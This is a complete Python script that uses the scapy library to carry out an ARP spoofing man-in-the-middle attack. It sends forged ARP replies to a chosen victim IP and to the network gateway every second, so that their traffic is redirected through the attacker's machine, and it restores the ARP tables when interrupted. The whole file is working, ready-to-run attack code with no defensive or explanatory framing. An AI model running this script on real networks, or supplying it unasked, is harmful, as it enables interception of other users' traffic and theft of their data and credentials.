#!/usr/bin/env python

from scapy.all import *
import time
import netifaces
import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

conf.verb = 0

def check_root():
    if os.geteuid() != 0:
        print("Script must run as root")
        sys.exit(1)

def get_gateway_ip():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways['default'][netifaces.AF_INET][0]
        return default_gateway
    except (KeyError, IndexError):
        return None

def get_internal_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    private_ip = s.getsockname()[0]
    s.close()
    return private_ip

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Could not find MAC address for IP: {ip}")
        sys.exit(1)

def spoof_arp(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)  
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  
    send(packet, verbose=False)

def restore_arp(target_ip, gateway_ip):
    print("\nRestoring ARP Tables")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)  
    send(packet, count=4, verbose=False)
    print("ARP tables restored.")

def arp_spoofing_attack(target_ip, gateway_ip):
    try:
        print("To stop press CTRL+C")
        while True:
            spoof_arp(target_ip, gateway_ip)
            spoof_arp(gateway_ip, target_ip)  
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C! Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip)
        sys.exit(1)

def main():
    check_root()
    victim_ip = sys.argv[1]
    router_ip = sys.argv[2] if len(sys.argv) > 2 else get_gateway_ip()
    print("Sending spoofed ARP packets")
    print("Router IP:", router_ip)
    print("Target IP:", victim_ip)
    arp_spoofing_attack(victim_ip, router_ip)

if __name__ == "__main__":
    main()